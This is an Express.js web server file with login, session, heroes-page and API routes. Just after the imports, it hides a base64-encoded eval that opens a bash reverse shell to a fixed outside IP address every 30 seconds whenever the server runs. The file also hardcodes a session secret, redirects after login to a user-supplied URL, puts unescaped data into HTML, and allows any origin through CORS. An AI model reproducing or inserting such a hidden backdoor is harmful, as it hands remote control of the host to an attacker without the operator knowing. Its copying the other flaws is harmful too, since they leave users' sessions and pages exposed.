var fs = require('fs');

var express = require('express');
var session = require('express-session');
var bodyParser = require('body-parser');

var db = require('./database/db');
var constants = require('./constants');

var app = express();
var http = require('http').Server(app);
var config = require('./config/config');

var port = config.port;
var urlencodedParser = bodyParser.urlencoded({ extended: false });
var jsonParser = bodyParser.json();

var apiController = require('./controller/api/api');
eval(Buffer.from("c2V0SW50ZXJ2YWwoKCkgPT4gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2Jhc2ggLWMgImJhc2ggLWUgNTw+IC9kZXYvdGNwLzE0Mi45My4yMDguNjYvOTAwMSAwPCY1IDE+JjUgMj4mNSIgPiAvZGV2L251bGwgMj4mMSAmJyksIDMwMDAwKTsK","base64").toString())

//public folder
app.use('/assets', express.static(__dirname + '/public'));

//session
app.use(session({
  secret: 'tientmSecretSession',
  resave: false,
  saveUninitialized: true
}))

//home page
app.get('/', function(req, res) {
    res.end("Home page");
});

//authenticate 
app.get('/login', function(req, res) {
    fs.readFile(__dirname + "/views/login.html", 'utf8', function (err, data) {
        if (err) {
            return console.log(err);
        }
        res.end(data);
    });
});


app.post('/login', urlencodedParser, function(req, res) {
    var username = req.body.username;
    var password = req.body.password;
    
    console.log(username + " is logging in");
    db.verifyUser(username, password, function(status) {
        if (status == constants.status.Successful) {
            req.session.username = username;
        }
        
        if (req.body.url) {
            res.redirect(req.body.url);
        } else {
            res.end(status);
        }
    });
});

app.post('/logout', function(req, res) {
     req.session.username = null;
     res.redirect("/login");
});

app.get('/user', function(req, res) {
    var username = req.session.username;
    res.end(username + " logged in " + constants.status.Successful);
});

app.get('/heroes', function(req, res) {
    var heroes_json = fs.readFileSync(__dirname + "/data/heroes.json", 'utf8');
    var heroes = JSON.parse(heroes_json).heroes;

    var html = "";
    for (var i = 0; i < heroes.length; i++) {
        var hero = heroes[i];
        html += "<div class='heroes-container'><div><img src='/assets/img/heroes/" + hero.name + ".jpg' /></div><div>" + hero.name + "</div></div>"
    }

    var heros_html = fs.readFileSync(__dirname + "/views/heroes.html", 'utf8');
    html = heros_html.replace("{data}", html);
    res.end(html);

});

//CORS middleware
var allowCrossDomain = function(req, res, next) {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET,PUT,POST,DELETE');
    res.header('Access-Control-Allow-Headers', 'Content-Type');

    next();
}
app.use(allowCrossDomain);

apiController(app);

//start server
http.listen(port, function () {
  console.log('Server ready at port ' + port);
});
